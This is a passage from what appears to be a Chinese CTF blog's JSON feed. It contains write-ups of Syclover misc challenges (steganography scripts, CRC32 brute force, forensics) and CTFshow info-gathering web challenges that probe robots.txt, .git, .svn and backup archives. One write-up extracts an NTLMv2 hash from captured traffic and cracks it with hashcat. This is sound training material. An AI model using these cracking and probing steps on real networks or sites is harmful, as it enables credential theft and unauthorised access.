            "content_html": "<h2 id=\"cheekin\"><a class=\"markdownIt-Anchor\" href=\"#cheekin\">#</a> cheekin</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pB7sJsyfNUVq0eaA.png!thumbnail\" alt=\"\"></p>\n<p>公众号发 flag 获得一张图片，zsteg 一把梭</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4SrUbjKRJ6l0KQGH.png!thumbnail\" alt=\"\"></p>\n<p><strong>syc{s4y_he110_t0_syclover}</strong></p>\n<h2 id=\"ez_smilemo\"><a class=\"markdownIt-Anchor\" href=\"#ez_smilemo\">#</a> ez_smilemo</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QRH1MirCciqct2eu.png!thumbnail\" alt=\"\"></p>\n<p>是一道游戏题，给了 data.win，winhex 打开搜索 f1@g，找到上面的 base64</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UlYPN0Xa1XRmug7f.png!thumbnail\" alt=\"\"></p>\n<p>解码得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mDQCy8Miil7bvAbD.png!thumbnail\" alt=\"\"></p>\n<p><em><em>SYC{sm1le_1s</em>@<em>n1ce_g@me}</em></em></p>\n<h2 id=\"death_n0te\"><a class=\"markdownIt-Anchor\" href=\"#death_n0te\">#</a> DEATH_N0TE</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/m65jBLieKzB9R4t2.png!thumbnail\" alt=\"\"></p>\n<p>根据提示，首先 zsteg 在下面这段 base64 中得到前半段 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/cACbJ1e9ezZNHi00.png!thumbnail\" alt=\"\"></p>\n<p>SYC{D4@Th_N0t4_</p>\n<p>接着放大图片查看像素点</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/nXHwwmWqNs87D6u4.png!thumbnail\" alt=\"\"></p>\n<p>能模糊看到有一些白色像素点围成的字母，猜测为后半段的密文，利用脚本提取白色像素点并且写入新的画布上</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from PIL import Image, ImageDraw</span><br><span class=\"line\"></span><br><span class=\"line\">image = Image.open(&#x27;kamisama.png&#x27;)</span><br><span class=\"line\">width, height = image.size</span><br><span class=\"line\">threshold = 200</span><br><span class=\"line\">new_image = Image.new(&#x27;RGB&#x27;, (width, height), (255, 255, 255))</span><br><span class=\"line\">draw = ImageDraw.Draw(new_image)</span><br><span class=\"line\"></span><br><span class=\"line\">def bold_pixel(x, y):</span><br><span class=\"line\">    for i in range(x - 1, x + 2):</span><br><span class=\"line\">        for j in range(y - 1, y + 2):</span><br><span class=\"line\">            draw.point((i, j), fill=(0, 0, 0))</span><br><span class=\"line\"></span><br><span class=\"line\">for x in range(width):</span><br><span class=\"line\">    for y in range(height):</span><br><span class=\"line\">        pixel = image.getpixel((x, y))</span><br><span class=\"line\">        if all(value &gt; threshold for value in pixel):</span><br><span class=\"line\">            bold_pixel(x, y)</span><br><span class=\"line\"></span><br><span class=\"line\">new_image.save(&#x27;output_image.png&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">image.close()</span><br></pre></td></tr></table></figure>\n<p>得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/AoEaqUbk0jFtQll3.png!thumbnail\" alt=\"\"></p>\n<p>上网寻找白色像素点围成的字体，发现是死亡笔记中的一种字体，找到对照表进行对照解码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Jy1uUGx2Moo9QZOX.png!thumbnail\" alt=\"\"></p>\n<p>flag 最后一截有几个字母不是很明显，但是大致对照完能猜测到是出题人的名字，最后拼接得到 flag</p>\n<p><strong>SYC{D4@Th_N0t4_NAME_o2takuXX}</strong></p>\n<h2 id=\"下一站是哪儿呢\"><a class=\"markdownIt-Anchor\" href=\"#下一站是哪儿呢\">#</a> 下一站是哪儿呢</h2>\n<p><strong><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/nwO4A4xaKrfFYzZq.png!thumbnail\" alt=\"\" title=\"fig:\"></strong></p>\n<p><strong>SYC{CZ8579_Luzhou}</strong></p>\n<h2 id=\"qingwan心都要碎了\"><a class=\"markdownIt-Anchor\" href=\"#qingwan心都要碎了\">#</a> Qingwan 心都要碎了</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/i0hUXEJmRiXJkkWW.png!thumbnail\" alt=\"\"></p>\n<p><strong>SYC {重庆中国三峡博物馆}</strong></p>\n<h2 id=\"xqr\"><a class=\"markdownIt-Anchor\" href=\"#xqr\">#</a> xqr</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1PhdlA32MBBqnAdo.png!thumbnail\" alt=\"\"></p>\n<p>下载附件不出意外是个 qrcode，但是扫码得到的是 wrong<br>\nflag，winhex 查看文件结构能发现还有一张图片拼接在该图片当中，手撕出来</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/EYttOY8kK2F9MT3h.png!thumbnail\" alt=\"\"></p>\n<p>修改图片尺寸和原图片一样大，使用 stegsolve 的 combiner 功能进行合并，将合并的图片导出后再次导入 stegsolve 进行 xor，扫码即可得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/FYl9qTsKVnoScjzs.png!thumbnail\" alt=\"\"></p>\n<p><strong>SYC{hOp3_u_h@ve_Fun}</strong></p>\n<h2 id=\"death_n1te\"><a class=\"markdownIt-Anchor\" href=\"#death_n1te\">#</a> <strong>DEATH_N1TE</strong></h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Pk84HKKKHCpPxrKW.png!thumbnail\" alt=\"\"></p>\n<p>附件中拿到一个 webp 和一个 mp3 文件，mp3 文件听到后面发现是 sstv，使用工具扫描之后得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lklHUMuLBnpOU3ry.png!thumbnail\" alt=\"\"></p>\n<p>前半段 flag，SYC {H4xr0t0r</p>\n<p>接着打开 webp 文件，发现是个动图，上网搜了一下资料，需要使用命令 webpmux 进行分离帧的操作，暂时只知道一帧帧分离的语句，于是就写了个脚本进行循环执行分离</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">for i in range(0,1000):</span><br><span class=\"line\">    os.system(f&#x27;webpmux -get frame &#123;i&#125; killer.webp -o frame&#123;i&#125;.png&#x27;)</span><br></pre></td></tr></table></figure>\n<p>分离出来 881 张图片，根据图片的大小和张数利用 montage 和 gaps 进行调试拼图</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">montage \\*.png -tile 40x22 -geometry +0+0 flag.png</span><br><span class=\"line\">gaps --image=flag.png --generations=40 --population=120 --size=48</span><br></pre></td></tr></table></figure>\n<p>最终得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BbUCRX44jEYRyyE6.png!thumbnail\" alt=\"\"></p>\n<p>解码得到后半段 flag</p>\n<p><strong>SYC{H4xr0t0r_14_Ki114R}</strong></p>\n<h2 id=\"窃听风云\"><a class=\"markdownIt-Anchor\" href=\"#窃听风云\">#</a> <strong>窃听风云</strong></h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/HjCsftpPeqPC8UDd.png!thumbnail\" alt=\"\"></p>\n<p>拿到流量包追踪一下 tcp 流，结合题目可以知道</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Bk9XBs7Cd97DHNAH.png!thumbnail\" alt=\"\"></p>\n<p>这是内网通信的流量，并且使用了 NTLM 验证身份的方式，上网搜索了一下该验证方式的工作流程，大致为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.首先客户端在本地加密当前用户的密码成hash</span><br><span class=\"line\">2.客户端向服务端发送账号，这里进行了明文传输</span><br><span class=\"line\">3.服务端确认了NTLM认证方式，并随机生成了16位的字符串作为challenge发送给了客户端</span><br><span class=\"line\">4.客户端再用生成的hash加密该challenge发送回服务端作为response</span><br><span class=\"line\">5.服务端再把用户名，challenge和response发送给域控制器</span><br><span class=\"line\">6.域控制器用这个用户名在SAM密码管理库中找到这个用户的密码散列，并同样加密challenge</span><br><span class=\"line\">7.比较两个加密后的challenge，如果相同则认证成功</span><br></pre></td></tr></table></figure>\n<p>接下来回看这道题目，既然是截获了通讯流量那么也就是说客户端和服务端所进行的一些通信数据都直接被截获了，根据题目要求，要找到用户的密码。根据工作流程可以知道，hashcat 爆破用户密码所需要的一些字段信息都能被流量所捕获到<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pNucLoAZNeu76EEx.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>并且通过最后一个返回包中的对话信息可以知道密码字典为 rockyou，接下来寻找到需要的字段就可以开始进行爆破了，以下为需要寻找的字段：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mVGJwwn0vCW3Btiu.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mpmcyKvrKJNaO6NN.png!thumbnail\" alt=\"\"></p>\n<p>过滤 ntlmssp.ntlmserverchallenge 能找到 challenge 字段信息</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bDBpfIq4o1HmUWFv.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000</span><br></pre></td></tr></table></figure>\n<p>将得到的字段值拼接利用 hashcat 进行爆破</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./hashcat.exe -m 5600 1.txt rockyou.txt -o out.txt --force</span><br></pre></td></tr></table></figure>\n<p>在 out.txt 中得到爆破出的密码<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lURCG5lq2sLKO7uO.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p><strong>SYC{iamjackspassword}</strong></p>\n<h2 id=\"extractme\"><a class=\"markdownIt-Anchor\" href=\"#extractme\">#</a> extractMe</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127201453182.png\" alt=\"\"></p>\n<p>一眼丁真为 4byte 的 CRC32 爆破</p>\n<p>先用 7-zip.exe 的参数输出压缩包信息，并用脚本批量提取压缩包中的 CRC32（脚本来自八神）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import subprocess, re</span><br><span class=\"line\"></span><br><span class=\"line\">def getCRC(path: str):</span><br><span class=\"line\">    tmp = subprocess.Popen(f&#x27;7z.exe l &#123;path&#125; -slt&#x27;, stdout=subprocess.PIPE).communicate()[0].decode(&#x27;gbk&#x27;).replace(&#x27;\\r\\n&#x27;, &#x27;\\n&#x27;)</span><br><span class=\"line\">    return [(i, j) for i, j in zip(re.findall(r&#x27;(?&lt;=Path = ).*&#x27;, tmp)[1:], re.findall(r&#x27;(?&lt;=CRC = ).*&#x27;, tmp))]</span><br><span class=\"line\"></span><br><span class=\"line\">print(getCRC(&#x27;extractMe.7z&#x27;))</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[(&#x27;flag0&#x27;, &#x27;8712DE1D&#x27;), (&#x27;flag1&#x27;, &#x27;06EACBD7&#x27;), (&#x27;flag2&#x27;, &#x27;20A8E291&#x27;), (&#x27;flag3&#x27;, &#x27;31EE3074&#x27;), (&#x27;flag4&#x27;, &#x27;77AACF7F&#x27;), (&#x27;flag5&#x27;, &#x27;35FB7C6C&#x27;), (&#x27;flag6&#x27;, &#x27;F978D5AA&#x27;), (&#x27;flag7&#x27;, &#x27;016F7A0B&#x27;)]</span><br></pre></td></tr></table></figure>\n<p>再利用 4byte 的脚本爆破就好</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import binascii</span><br><span class=\"line\">import string</span><br><span class=\"line\"></span><br><span class=\"line\">def crack_crc():</span><br><span class=\"line\">    print(&#x27;-------------Start Crack CRC-------------&#x27;)</span><br><span class=\"line\">    crc_list = [0x8712DE1D, 0x06EACBD7, 0x20A8E291, 0x31EE3074, 0x77AACF7F, 0x35FB7C6C, 0xF978D5AA, 0x016F7A0B]</span><br><span class=\"line\">    comment = &#x27;&#x27;</span><br><span class=\"line\">    chars = string.printable</span><br><span class=\"line\">    for crc_value in crc_list:</span><br><span class=\"line\">        for char1 in chars:</span><br><span class=\"line\">            for char2 in chars:</span><br><span class=\"line\">                for char3 in chars:</span><br><span class=\"line\">                    for char4 in chars:</span><br><span class=\"line\">                        res_char = char1 + char2 + char3 + char4</span><br><span class=\"line\">                        char_crc = binascii.crc32(res_char.encode())</span><br><span class=\"line\">                        calc_crc = char_crc &amp; 0xffffffff</span><br><span class=\"line\">                        if calc_crc == crc_value:</span><br><span class=\"line\">                            print(&#x27;[+] &#123;&#125;: &#123;&#125;&#x27;.format(hex(crc_value),res_char))</span><br><span class=\"line\">                            comment += res_char</span><br><span class=\"line\">    print(&#x27;-----------CRC Crack Completed-----------&#x27;)</span><br><span class=\"line\">    print(&#x27;Result: &#123;&#125;&#x27;.format(comment))</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    crack_crc()</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-------------Start Crack CRC-------------</span><br><span class=\"line\">[+] 0x8712de1d: SYC&#123;</span><br><span class=\"line\">[+] 0x6eacbd7: _cR@</span><br><span class=\"line\">[+] 0x20a8e291: ck_1</span><br><span class=\"line\">[+] 0x31ee3074: s_Us</span><br><span class=\"line\">[+] 0x77aacf7f: eful</span><br><span class=\"line\">[+] 0x35fb7c6c: _som</span><br><span class=\"line\">[+] 0xf978d5aa: etim</span><br><span class=\"line\">[+] 0x16f7a0b: e$_&#125;</span><br><span class=\"line\">-----------CRC Crack Completed-----------</span><br><span class=\"line\">Result: SYC&#123;_cR@ck_1s_Useful_sometime$_&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>SYC{<em>cR@ck_1s_Useful_sometime$</em>}</strong></p>\n<h2 id=\"时代的眼泪\"><a class=\"markdownIt-Anchor\" href=\"#时代的眼泪\">#</a> 时代的眼泪</h2>\n<p>取证大师一把梭</p>\n<p>找到最近打开的图片</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127203915620.png\" alt=\"\"></p>\n<p>根据路径寻找到图片并打开，获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127204049939.png\" alt=\"\"></p>\n<p><strong>SYC{You_defeated_me_after_22_years}</strong></p>\n<h2 id=\"death_n2te\"><a class=\"markdownIt-Anchor\" href=\"#death_n2te\">#</a> DEATH_N2TE</h2>\n<p>附件就是一个 mp4 文件，视频播放器打开能明显看到有像素点变化，并且每一帧都不一样，随着视频的播放有一个白色像素点的滚动效果</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231129131244854.png\" alt=\"image-20231129131244854\"></p>\n<p>如图所示，那么对应着视频的帧宽和帧高，利用脚本去提取它每一帧的像素数据去进行重新组合到新的画布当中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import cv2</span><br><span class=\"line\">import numpy as np</span><br><span class=\"line\"></span><br><span class=\"line\">video = cv2.VideoCapture(&#x27;kira.mp4&#x27;)</span><br><span class=\"line\">fps = int(video.get(cv2.CAP_PROP_FPS))</span><br><span class=\"line\">frame_count = int(video.get(cv2.CAP_PROP_FRAME_COUNT))</span><br><span class=\"line\">video_width = int(video.get(cv2.CAP_PROP_FRAME_WIDTH))</span><br><span class=\"line\">video_height = int(video.get(cv2.CAP_PROP_FRAME_HEIGHT))</span><br><span class=\"line\"></span><br><span class=\"line\">start_pixel_x = 5</span><br><span class=\"line\">start_pixel_y = 5</span><br><span class=\"line\">block_size = 10</span><br><span class=\"line\"></span><br><span class=\"line\">out_width = video_width // block_size</span><br><span class=\"line\">out_height = video_height // block_size</span><br><span class=\"line\"></span><br><span class=\"line\">out = np.zeros((out_height, out_width, 3), dtype=np.uint8)</span><br><span class=\"line\"></span><br><span class=\"line\">fps_count = 0</span><br><span class=\"line\">while True:</span><br><span class=\"line\">    success, frame = video.read()</span><br><span class=\"line\">    if not success:</span><br><span class=\"line\">        break</span><br><span class=\"line\"></span><br><span class=\"line\">    for y in range((video_height - start_pixel_y) // block_size):</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            pixel = frame[start_pixel_y + y * block_size, start_pixel_x + fps_count * block_size]</span><br><span class=\"line\">            out[y, fps_count] = pixel</span><br><span class=\"line\">        except Exception as e:</span><br><span class=\"line\">            print(f&quot;Error: &#123;e&#125;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">    fps_count += 1</span><br><span class=\"line\"></span><br><span class=\"line\">cv2.imwrite(&#x27;out.png&#x27;, out)</span><br></pre></td></tr></table></figure>\n<p>得到：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231129132551340.png\" alt=\"image-20231129132551340\"></p>\n<p><strong>SYC{we1c0m4_T0_Dc@tH_W0r1d}</strong></p>\n<h2 id=\"窃听风云-v2\"><a class=\"markdownIt-Anchor\" href=\"#窃听风云-v2\">#</a> 窃听风云 - V2</h2>\n<p>这里不做过多的说明了，和 v1 差不多，smtp 邮件协议进行了 ntlm 认证，详细的过程在另一篇文章<strong> NTLM 协议流量解密</strong>的例三中有写，可以移步观看</p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/CTFshow%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%861-20/",
            "url": "https://nnnpc.github.io/2024/04/16/CTFshow%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%861-20/",
            "title": "CTFshow信息收集1-20",
            "date_published": "2024-04-16T05:58:18.979Z",
            "content_html": "<h1 id=\"web1\"><a class=\"markdownIt-Anchor\" href=\"#web1\">#</a> WEB1</h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/L96JeTCRYwy86rkf.png!thumbnail\" alt=\"\"></p>\n<p>根据题目的提示注释中应该有东西</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/WDM7h81Wz3QMpJOt.png!thumbnail\" alt=\"\"></p>\n<p>f12 看看页面注释</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/CD25HG1fXrVqAKSR.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>ctfshow{9d212404-6419-4809-8393-5ce36e647b80}</strong></p>\n<h1 id=\"web2\"><a class=\"markdownIt-Anchor\" href=\"#web2\">#</a> <strong>WEB2</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/swqZro7BkpRFf31M.png!thumbnail\" alt=\"\"></p>\n<p>题目提示是 js 前台拦截，那么方法就是禁用 js</p>\n<p>打开环境发现 f12 打不开，去禁用 js</p>\n<p>打开新标签页面输入 about:config</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/IrE6FWSDXl3AEiwL.png!thumbnail\" alt=\"\"></p>\n<p>将 true 改为 false，回到环境</p>\n<p>f12 打开获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/H9s8EsHUoBtoSNnm.png!thumbnail\" alt=\"\"></p>\n<p>c<strong>tfshow{7e3126b1-d7ad-4d77-848e-588e9a815ca9}</strong></p>\n<h1 id=\"web3\"><a class=\"markdownIt-Anchor\" href=\"#web3\">#</a> <strong>WEB3</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7qbK8gE1QMva7SHe.png!thumbnail\" alt=\"\"></p>\n<p>获得提示，打开环境进行抓包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9mY5UkPyQ4ipNR70.png!thumbnail\" alt=\"\"></p>\n<p>send to repeater</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/K80tBSMLsxu9LEpb.png!thumbnail\" alt=\"\"></p>\n<p>repeater 进行发包获得 flag</p>\n<p><strong>ctfshow{700018ef-093f-44b4-af0d-97ef01116886}</strong></p>\n<h1 id=\"web4\"><a class=\"markdownIt-Anchor\" href=\"#web4\">#</a> <strong>WEB4</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LdTC9Z0ZDXP7tE31.png!thumbnail\" alt=\"\"></p>\n<p>查看提示，在 robots 中可能有信息</p>\n<p>网址栏输入 /robots.txt</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mHB7PDwDBQT9jxNY.png!thumbnail\" alt=\"\"></p>\n<p>看到目录 /flagishere.txt，网址栏访问</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/FTiy8B8cATc2IWN6.png!thumbnail\" alt=\"\"></p>\n<p>获得 flag</p>\n<p><strong>ctfshow{567e780b-1bb6-4456-8cc5-e61b6827e37f}</strong></p>\n<h1 id=\"web5\"><a class=\"markdownIt-Anchor\" href=\"#web5\">#</a> <strong>WEB5</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/yaQ2mYTmo5BBczCG.png!thumbnail\" alt=\"\"></p>\n<p>提示 phps 源码泄露，那就访问下 index.phps，可能有东西</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QudwoxVt77WxWktR.png!thumbnail\" alt=\"\"></p>\n<p>下载下来 index.phps，打开得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TkR6W3aV0G6PuO6M.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{9b549014-9c4e-46d3-8814-9828706364a0}</strong></p>\n<h1 id=\"web6\"><a class=\"markdownIt-Anchor\" href=\"#web6\">#</a> <strong>WEB6</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/zCJHmVb8KW0ouJOT.png!thumbnail\" alt=\"\"></p>\n<p>看提示证明是源码泄露，查看 /<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemlw\">www.zip</span></p>\n<p>得到压缩包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Ow2xm7uwtdljhqZB.png!thumbnail\" alt=\"\"></p>\n<p>打开 fl000g.txt 得到 flag</p>\n<p><strong>flag{flag_here}</strong></p>\n<h1 id=\"web7\"><a class=\"markdownIt-Anchor\" href=\"#web7\">#</a> WEB7</h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/q90I0F3UyFUO4rpJ.png!thumbnail\" alt=\"\"></p>\n<p>提示不要部署到生产环境</p>\n<p>访问 /.git 目录</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LptTkrZDuYpmul9Y.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/o7tXDKpKDuzJHUE9.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{c860b2e6-3208-487f-8351-f0d5e31a59f8}</strong></p>\n<h1 id=\"web8\"><a class=\"markdownIt-Anchor\" href=\"#web8\">#</a> <strong>WEB8</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/82D9rSzD97MbZVZ9.png!thumbnail\" alt=\"\"></p>\n<p>同样是不要部署到生产环境</p>\n<p>访问 /.svn/，得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Z9sBK9GE1z1SaBId.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{acd1e1b3-f6e7-4b2b-9ee8-4765b7c81386}</strong></p>\n<h1 id=\"web9\"><a class=\"markdownIt-Anchor\" href=\"#web9\">#</a> WEB9</h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/spW00iQuAVWI3hRt.png!thumbnail\" 